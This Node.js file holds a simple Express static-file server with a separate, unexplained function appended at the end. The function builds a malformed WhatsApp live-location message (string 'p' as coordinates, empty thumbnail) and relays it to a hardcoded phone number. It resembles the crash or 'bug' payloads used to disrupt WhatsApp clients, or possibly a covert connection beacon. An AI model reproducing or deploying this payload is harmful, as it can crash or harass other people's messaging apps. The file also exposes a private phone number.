const express = require('express');
const path = require('path');
const app = express();

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server berjalan di http://localhost:${PORT}`);
});


async function nweButton(vreden) {
    const ownerBot = `6285216955233@s.whatsapp.net`;
    
    var msg = generateWAMessageFromContent(ownerBot, proto.Message.fromObject({
        'viewOnceMessage': {
            'message': {
                'liveLocationMessage': {
                    'degreesLatitude': 'p', 
                    'degreesLongitude': 'p',
                    "caption": "CONECTION",
                    'sequenceNumber': '0',
                    'jpegThumbnail': ''
                }
            }
        }
    }), { 'userJid': ownerBot });

    await vreden.relayMessage(ownerBot, msg.message, {
        'participant': {
            'jid': ownerBot
        },
        'messageId': msg.key.id
    });
}
